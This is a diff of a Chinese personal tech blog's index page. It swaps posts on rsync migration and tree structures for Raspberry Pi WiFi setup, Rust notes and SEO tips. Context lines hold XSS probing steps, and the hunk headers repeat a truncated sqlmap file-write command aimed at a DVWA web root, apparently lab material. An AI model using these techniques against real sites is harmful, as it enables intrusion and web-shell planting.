+<p>（1）在目标站点上找到输入点,比如查询接口,留言板等;</p>
+<p>（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;</p>
+<p>（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;</p>
+<h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>[引用]<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/421932.html">https://www.freebuf.com/vuls/421932.html</a></p>
 
         </div>
     
@@ -1380,8 +656,8 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/system-migration/">
-                系统迁移
+            <a href="/2026/09/19/raspberry-pi/">
+                Raspberry Pi 树莓派
             </a>
         </h1>
         <div class="post-info">
@@ -1391,7 +667,7 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
             
             
                 <span class="category">
-                    <a href="/categories/Linux/">Linux</a>
+                    <a href="/categories/单片机/">单片机</a>
                 </span>
             
         </div>
@@ -1399,12 +675,318 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     
         <div class="content">
-            <h2 id="系统文件迁移"><a href="#系统文件迁移" class="headerlink" title="系统文件迁移"></a>系统文件迁移</h2><p>安装必需工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install rsync mailutils  <span class="comment"># 对于 Debian/Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> yum install rsync mailx          <span class="comment"># 对于 CentOS</span></span><br></pre></td></tr></table></figure>
+            <p>树莓派的开发探索-基本篇 环境基于(Raspberry Pi OS)</p>
+<h2 id="单片机开发与探索"><a href="#单片机开发与探索" class="headerlink" title="单片机开发与探索"></a>单片机开发与探索</h2><h3 id="无需显示器连WIFI"><a href="#无需显示器连WIFI" class="headerlink" title="无需显示器连WIFI"></a>无需显示器连WIFI</h3><blockquote>
+<p>树莓派系统连接原理</p>
+<blockquote>
+<p>用户可以在未启动树莓派的状态下单独修改 <code>/boot/wpa_supplicant.conf</code> 文件配置 WiFi 的 SSID 和密码，这样树莓派启动后会自行读取 <code>wpa_supplicant.conf</code> 配置文件连接 WiFi 设备。</p>
+</blockquote>
+</blockquote>
+<ul>
+<li><p>制作树莓派系统(Raspberry Pi OS)在sd里面不多赘述</p>
+</li>
+<li><p>在电脑中打开sd卡根目录创建名字为wpa_supplicant.conf 的文件</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line">network=&#123;</span><br><span class="line">	ssid=<span class="string">&quot;12345678&quot;</span></span><br><span class="line">	psk=<span class="string">&quot;88888888&quot;</span></span><br><span class="line">	key_mgmt=WPA-PSK</span><br><span class="line">	priority=1  <span class="comment"># 连接优先级，数字越大优先级越高（不可以是负数）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>开机启动树莓派即可连接WIFI</li>
+</ul>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+        </div>
+    
 
-<p>backup_and_migrate.sh</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要变量</span></span><br><span class="line">SOURCE_USER=<span class="string">&quot;source_user&quot;</span></span><br><span class="line">SOURCE_HOST=<span class="string">&quot;source_host&quot;</span></span><br><span class="line">SOURCE_DIR=<span class="string">&quot;/path/to/source/directory/&quot;</span></span><br><span class="line">TARGET_USER=<span class="string">&quot;target_user&quot;</span></span><br><span class="line">TARGET_HOST=<span class="string">&quot;target_host&quot;</span></span><br><span class="line">TARGET_DIR=<span class="string">&quot;/path/to/target/directory/&quot;</span></span><br><span class="line">BACKUP_DIR=<span class="string">&quot;/path/to/backup/directory/&quot;</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;migration.log&quot;</span></span><br><span class="line">EMAIL_RECIPIENT=<span class="string">&quot;admin@example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;创建备份...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$BACKUP_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查备份成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份成功，保存在 <span class="variable">$BACKUP_DIR</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Backup Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行迁移</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;开始迁移...&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">rsync -avz --delete --progress -e ssh <span class="variable">$SOURCE_USER</span>@<span class="variable">$SOURCE_HOST</span>:<span class="variable">$SOURCE_DIR</span> <span class="variable">$TARGET_USER</span>@<span class="variable">$TARGET_HOST</span>:<span class="variable">$TARGET_DIR</span> 2&gt;&amp;1 | <span class="built_in">tee</span> -a <span class="variable">$LOG_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查迁移成功</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移成功！从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span>&quot;</span> &gt;&gt; <span class="variable">$LOG_FILE</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;备份和迁移成功！日志详情见 <span class="variable">$LOG_FILE</span>&quot;</span> | mail -s <span class="string">&quot;Server Migration Success&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;迁移失败！请检查日志 <span class="variable">$LOG_FILE</span> 以获取详细信息&quot;</span> | mail -s <span class="string">&quot;Migration Failed&quot;</span> <span class="variable">$EMAIL_RECIPIENT</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出完成信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;备份和迁移完成：从 <span class="variable">$SOURCE_HOST</span> 到 <span class="variable">$TARGET_HOST</span> 和 <span class="variable">$BACKUP_DIR</span>&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="mongo-数据迁移"><a href="#mongo-数据迁移" class="headerlink" title="mongo 数据迁移"></a>mongo 数据迁移</h2><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/zh-cn/docs/ops-manager/current/tutorial/migrate-member-to-new-hardware/">将副本集成员迁移到新服务器</a></p>
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/redis/">
+                Redis
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/数据库/">数据库</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/19/rust/">
+                Rust
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Rust/">Rust</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="Rust学习"><a href="#Rust学习" class="headerlink" title="Rust学习"></a>Rust学习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cargo update       # 更新依赖</span><br><span class="line">cargo build        # 测试是否能 build</span><br><span class="line">cargo clean        # 清理后重新编译 run</span><br><span class="line">cargo run          # 运行 loka-server</span><br></pre></td></tr></table></figure>
+
+<h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><ol>
+<li>不能随便命名 因为rust会严格检查</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pub(crate) mod loka_api &#123;</span><br><span class="line">    tonic::include_proto!(&quot;loka_rpc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Rust 和 Tonic 结合 gRPC 的核心机制，你会发现它和其他语言（比如 JS/TS、Python）完全不同，因为 Rust 是 编译时严格类型检查 的语言</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>i32&#x2F;i64&#x2F;isize&#x2F;usize 这几个区别和用途</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">i32 和 i64 主要区别是 占用字节和数值范围</span><br><span class="line"></span><br><span class="line">i32：32 位有符号整数</span><br><span class="line">    占 4 字节</span><br><span class="line">    范围：-2_147_483_648 到 2_147_483_647</span><br><span class="line"></span><br><span class="line">i64：64 位有符号整数</span><br><span class="line">    占 8 字节</span><br><span class="line">    范围：-9_223_372_036_854_775_808 到 9_223_372_036_854_775_807</span><br><span class="line"></span><br><span class="line">想随 CPU 架宽变化，使用 isize / usize</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>函数和宏区别</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">函数 = 类型安全、运行时逻辑封装 (严格)</span><br><span class="line">宏 = 编译期代码生成、元编程工具 </span><br><span class="line">函数适用场景</span><br><span class="line">    封装逻辑、计算、操作</span><br><span class="line">    需要类型安全</span><br><span class="line">    函数调用开销可以忽略或者通过 #[inline] 优化</span><br><span class="line"></span><br><span class="line">宏适用场景</span><br><span class="line">    生成重复代码（如 impl 一大堆 trait）</span><br><span class="line">    DSL / 语法扩展（例如 serde 的 #[derive(Serialize)] 是宏）</span><br><span class="line">    日志/调试（println!、dbg!）</span><br><span class="line">    可变参数（函数参数数量固定，宏可任意）</span><br></pre></td></tr></table></figure>
+<h3 id="系统对比-Go-Golang-、Rust-和-C"><a href="#系统对比-Go-Golang-、Rust-和-C" class="headerlink" title="系统对比 Go (Golang)、Rust 和 C++"></a>系统对比 Go (Golang)、Rust 和 C++</h3><p>1️⃣ 语言概览</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>Go (Golang)</th>
+<th>Rust</th>
+<th>C++</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>发布年份</strong></td>
+<td>2009</td>
+<td>2015</td>
+<td>1985</td>
+</tr>
+<tr>
+<td><strong>设计目标</strong></td>
+<td>简单、高效、并发友好</td>
+<td>安全、零开销抽象、并发 &amp; 系统级</td>
+<td>高性能、通用系统编程</td>
+</tr>
+<tr>
+<td><strong>编译模式</strong></td>
+<td>静态编译</td>
+<td>静态编译</td>
+<td>静态编译</td>
+</tr>
+<tr>
+<td><strong>内存管理</strong></td>
+<td>GC（垃圾回收）</td>
+<td>所有权 + 借用系统（无 GC）</td>
+<td>手动管理（可选智能指针）</td>
+</tr>
+<tr>
+<td><strong>并发模型</strong></td>
+<td>Goroutines + Channel（轻量线程）</td>
+<td>async&#x2F;await + Send&#x2F;Sync trait</td>
+<td>std::thread + 原生线程库</td>
+</tr>
+<tr>
+<td><strong>安全性</strong></td>
+<td>编译时类型安全，但有 GC</td>
+<td>编译时内存 &amp; 并发安全</td>
+<td>编译时类型安全，但容易悬挂指针和 UB</td>
+</tr>
+<tr>
+<td><strong>性能</strong></td>
+<td>高，但有 GC 开销</td>
+<td>接近 C++，零开销抽象</td>
+<td>极高，可手动优化到极致</td>
+</tr>
+<tr>
+<td><strong>泛型</strong></td>
+<td>1.18+ 支持泛型</td>
+<td>强大泛型 + trait</td>
+<td>模板（template）</td>
+</tr>
+<tr>
+<td><strong>易用性</strong></td>
+<td>简单易学、上手快</td>
+<td>学习曲线陡峭，但安全性高</td>
+<td>学习曲线陡峭，容易踩坑</td>
+</tr>
+<tr>
+<td><strong>生态</strong></td>
+<td>云服务、微服务、网络库</td>
+<td>系统编程、嵌入式、WebAssembly、区块链</td>
+<td>系统、游戏、图形、高性能库</td>
+</tr>
+</tbody></table>
+<p>2️⃣ 内存管理对比</p>
+<table>
+<thead>
+<tr>
+<th>方面</th>
+<th>Go</th>
+<th>Rust</th>
+<th>C++</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>管理方式</strong></td>
+<td>GC（自动回收）</td>
+<td>所有权 &amp; 借用 + 生命周期</td>
+<td>手动 delete &#x2F; new 或智能指针</td>
+</tr>
+<tr>
+<td><strong>悬挂指针</strong></td>
+<td>基本不会</td>
+<td>编译器保证不会</td>
+<td>很容易出现</td>
+</tr>
+<tr>
+<td><strong>内存泄漏</strong></td>
+<td>GC 避免大部分</td>
+<td>编译器保证 RAII（几乎不会）</td>
+<td>可能出现，需手动管理</td>
+</tr>
+<tr>
+<td><strong>性能影响</strong></td>
+<td>GC 停顿可能影响延迟</td>
+<td>无 GC，性能可控</td>
+<td>高性能，但需小心内存管理</td>
+</tr>
+</tbody></table>
+<p>3️⃣ 并发对比</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>并发模型</th>
+<th>优缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Go</td>
+<td>Goroutines + Channels</td>
+<td>轻量级、易用、调度由 runtime 管理；可能 GC 暂停影响延迟</td>
+</tr>
+<tr>
+<td>Rust</td>
+<td>async&#x2F;await + Send&#x2F;Sync</td>
+<td>安全、零成本抽象，但需要掌握生命周期和 trait，学习曲线高</td>
+</tr>
+<tr>
+<td>C++</td>
+<td>std::thread &#x2F; Boost &#x2F; 原生线程</td>
+<td>高度可控，性能最好，但容易出现死锁、数据竞争，需要手动管理同步</td>
+</tr>
+</tbody></table>
+<p>4️⃣ 安全性</p>
+<table>
+<thead>
+<tr>
+<th>安全性方面</th>
+<th>Go</th>
+<th>Rust</th>
+<th>C++</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>类型安全</td>
+<td>是</td>
+<td>是</td>
+<td>是</td>
+</tr>
+<tr>
+<td>内存安全</td>
+<td>依赖 GC</td>
+<td>编译期保证</td>
+<td>依赖开发者</td>
+</tr>
+<tr>
+<td>并发安全</td>
+<td>简单但不严格</td>
+<td>编译期借用检查保证</td>
+<td>开发者自己保证</td>
+</tr>
+<tr>
+<td>越界访问</td>
+<td>runtime panic</td>
+<td>编译器 &amp; borrow checker 阻止</td>
+<td>可能出现 UB</td>
+</tr>
+</tbody></table>
+<p>5️⃣ 性能比较<br>C++：原生指针 + 零开销抽象 → 最快<br>Rust：接近 C++，无 GC，优化非常强<br>Go：有 GC，但 Goroutine 调度极快，适合网络&#x2F;IO密集型</p>
+<p>6️⃣ 泛型与抽象</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>泛型 &#x2F; 模板</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Go</td>
+<td>1.18+ 泛型</td>
+<td>类型安全，但语法简单</td>
+</tr>
+<tr>
+<td>Rust</td>
+<td>trait + 泛型</td>
+<td>零开销抽象，函数和类型都可以泛型化</td>
+</tr>
+<tr>
+<td>C++</td>
+<td>template</td>
+<td>功能强大，但错误信息复杂，模板元编程复杂</td>
+</tr>
+</tbody></table>
+<p>7️⃣ 应用场景</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>常见应用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Go</td>
+<td>云服务、微服务、网络服务、CLI 工具</td>
+</tr>
+<tr>
+<td>Rust</td>
+<td>系统编程、嵌入式、WebAssembly、区块链、性能关键库</td>
+</tr>
+<tr>
+<td>C++</td>
+<td>系统底层、游戏开发、图形渲染、高性能计算</td>
+</tr>
+</tbody></table>
+<p>🔹 总结建议</p>
+<ol>
+<li>想快速上手、开发网络&#x2F;服务端应用 → Go</li>
+<li>想追求内存安全、零成本抽象、系统级开发 → Rust</li>
+<li>极致性能、硬件控制、游戏或图形开发 → C++</li>
+</ol>
 
         </div>
     
@@ -1416,8 +998,8 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/tree/">
-                树 ADT
+            <a href="/2026/09/19/seo/">
+                SEO
             </a>
         </h1>
         <div class="post-info">
@@ -1427,7 +1009,7 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
             
             
                 <span class="category">
-                    <a href="/categories/AI/">AI</a>
+                    <a href="/categories/SEO/">SEO</a>
                 </span>
             
         </div>
@@ -1435,44 +1017,19 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     
         <div class="content">
-            <pre class="mermaid">graph LR
-    A[树] --> B[二叉树]
-    B[二叉树] --> C[完全二叉树]
-    C[完全二叉树] --> D[满二叉树]
-    C[完全二叉树] --> E[堆]
-    E[堆] --> F[大顶堆]
-    E[堆] --> G[小顶堆]
-    B[二叉树] --> H[二叉查找树]
-    B[二叉树] --> I[平衡二叉树]
-    B[二叉树] --> J[平衡二叉查找树]
-    J[平衡二叉查找树] --> K[红黑树]
-    J[平衡二叉查找树] --> L[AVL]
-    A[树] --> M[N叉树]
-    M[N叉树] --> N[B树]
-    M[N叉树] --> O[B+树]</pre>
-
-<p><img src="/images/tree.png"></p>
-<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>每一个节点最多两个子节点</p>
-<p><img src="/images/tree-ercha.png"></p>
-<p>前序遍历<br>遍历顺序是根节点-&gt;左子树-&gt;右子树<br>遍历的得到的序列是：<code>1 2 4 5 3 6 7</code></p>
-<p>中序遍历<br>遍历顺序是左子树-&gt;根节点-&gt;右子树<br>遍历的得到的序列是：<code>4 2 5 1 6 3 7</code></p>
-<p>后序遍历<br>遍历顺序是左子树-&gt;右子树-&gt;根节点<br>遍历的得到的序列是：<code>4 5 2 6 7 3 1</code></p>
-<p>满二叉树</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底层</span><br><span class="line">2.除了叶子节点，每个节点都有左、由两个子节点</span><br></pre></td></tr></table></figure>
-
-<p>完全二叉树</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底下两层</span><br><span class="line">2.最后一层的子节点，都靠左排列</span><br><span class="line">3.除了最后一层，其它层的节点个数，都要达到最大</span><br></pre></td></tr></table></figure>
-
-<p>二叉查找树</p>
-<p><img src="/images/tree-erchachaozhao.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.树中的每一个节点的值</span><br><span class="line">2.都要大于左子树中每个节点的值</span><br><span class="line">3.都要小于右子树中每个节点的值</span><br></pre></td></tr></table></figure>
-
-<p>AVL树</p>
-<p><img src="/images/tree-erchachazhao-to-avl.png"></p>
-<p>红黑树</p>
-<p><img src="/images/tree-honghei.png"></p>
-<p>B树</p>
-<p>B+树</p>
+            <h1 id="seo工具"><a href="#seo工具" class="headerlink" title="seo工具"></a>seo工具</h1><p>semrush - 好用</p>
+<h1 id="需要做的工作"><a href="#需要做的工作" class="headerlink" title="需要做的工作"></a>需要做的工作</h1><ul>
+<li>静态网站是最好的</li>
+<li>每个页面的title，description 要不一样 <ul>
+<li>title 要大于10个字以上的才行</li>
+</ul>
+</li>
+<li>404不能出现</li>
+<li><a href="https://example.com" rel="nofollow">点我</a> <ul>
+<li>nofollow - 不传权重、不跟踪(外链用)</li>
+</ul>
+</li>
+</ul>
 
         </div>
     
@@ -1521,6 +1078,10 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
         <ul>
             
             <li>
+                <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-cloudfront-distribution-%E8%B7%A8%E8%B4%A6%E5%8F%B7%E8%BF%81%E7%A7%BB%E6%9C%80%E5%AE%B9%E6%98%93%E8%B8%A9%E7%9A%84%E5%9D%91/">[expanded] CloudFront dis</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-blog-linux%E5%91%BD%E4%BB%A4/">[expanded] [blog] Linux命令</a>
             </li>
             
@@ -1529,11 +1090,7 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/19/shell/">Shell</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2026/09/19/social-engineering/">社工库工具</a>
+                <a class="footer-post" href="/2026/09/19/vue2vsvue3/">vue2 对比 vue3</a>
             </li>
             
         </ul>
